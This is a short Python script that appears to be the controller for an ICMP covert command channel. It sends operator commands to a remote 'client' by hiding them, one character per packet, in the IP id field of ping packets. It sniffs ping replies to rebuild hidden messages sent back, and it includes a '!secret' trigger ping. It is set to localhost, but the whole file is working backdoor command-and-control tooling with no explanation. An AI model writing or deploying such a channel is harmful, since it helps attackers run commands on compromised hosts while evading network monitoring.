import socket
import time
import os
import random
import requests
from multiprocessing import Process
from scapy.all import *
from scapy.layers.inet import ICMP, IP

destIP = 'localhost'
srcIP = 'localhost'
interface = '\\Device\\NPF_Loopback'

secretMessage = ''

def sendSecretPing():
    packet = IP(dst=destIP, src=srcIP, id = 65535) / ICMP(type=8)
    send(packet)


def sendCommandPing(command):
    packet = IP(dst=destIP, src=srcIP, id=65534) / ICMP(type=8)
    send(packet)

    for char in [*command]:
        time.sleep(0.1)
        send(IP(dst=destIP, src=srcIP, id=ord(char)|0x8000) / ICMP(type=8))

    packet = IP(dst=destIP, src=srcIP, id=65533) / ICMP(type=8)
    send(packet)


def processPacket(packet):
    global secretMessage
    if packet[ICMP].type == 0:
        if packet[IP].id & 0x8000 == 0x8000:
            char = chr(packet[IP].id & 0x7FFF)
            secretMessage += char
            packet.summary()
            print(secretMessage)
        else:
            secretMessage = ''



def startSniff():
    sniff(iface=interface, prn=processPacket, filter="icmp")

if __name__ == '__main__':
    p = Process(target=startSniff)
    p.start()

    while True:
        time.sleep(2)
        command = input("What would you like to do: \n")

        if command == '!secret':
            sendSecretPing()
        elif command == '!command':
            command = input("What command should the client run?: \n")
            sendCommandPing(command)
            secretMessage = ''

